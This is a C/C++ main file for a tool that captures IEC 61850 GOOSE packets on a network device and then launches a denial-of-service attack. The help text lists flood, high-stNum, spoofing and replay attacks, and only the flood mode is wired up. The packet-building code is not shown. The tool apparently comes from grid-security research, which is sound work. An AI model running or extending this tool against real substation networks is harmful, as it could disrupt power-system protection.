/***********************************************************
 * Author: Wen Li
 * Date  : 11/08/2019
 * Describe: dos attack analysis 
 * History:
   <1> 11/08/2019 , create
************************************************************/
#include "GsAttack.h"


VOID* GsListening (VOID* Arg)
{
    GsCapture *GsCap = (GsCapture *)Arg;

    GsCap->CapturePacket ((pcap_handler)GsCapture::Analysis);
    return NULL;
}

VOID Help ()
{
    printf("************************************************\r\n");
    printf("*                help information              *\r\n");
    printf("************************************************\r\n");
    printf("-d device-name \r\n");
    printf("-p: Possible Forms of Attack\r\n");
    printf("-f: GOOSE Flood Attack\r\n");
    printf("-h: High stNum GOOSE Attack\r\n");
    printf("-s: Semantic Spoofing GOOSE Attack \r\n");
    printf("-r: GOOSE Replay Attack \r\n");
    printf("************************************************\r\n\r\n");

    return;
}

int main(int argc, char *argv[])
{
    SinglDos SDos;
    pthread_t Tid;
    string Device;
    ATTACK_TYPE AttType = ATTACK_NULL;
    
    char ch;
    while((ch = getopt(argc, argv, "d:pfhsr")) != -1)
    {
        switch(ch)
        {
            case 'd':
            {
                Device = optarg;
                break;
            }
            case 'f':
            {
                AttType = ATTACK_GS_FLOOD;
                break;
            }

            default:
            {
                Help ();
                return 0;
            }
        }
    }

    if (Device == "" || AttType == ATTACK_NULL)
    {
        Help ();
        return 0;
    }

    DosAttack *DosAtt = SDos.GetDosAttacker ();
    assert (DosAtt != NULL);
    DosAtt->SetAttType (AttType);

    GsCapture GsCap (string(Device.c_str()));
    DWORD Ret = pthread_create(&Tid, NULL, GsListening, &GsCap);
    assert (Ret == 0);

    while (true)
    {
        if (DosAtt->GetCapPktNum ())
        {
            DosAtt->Attack(Device);     //Packet cannot be read after closing capture.
            
            break;
        }
        else
        {
            DebugPrint ("capture no packets yet...");
        }
    }
	
	return 0;
}

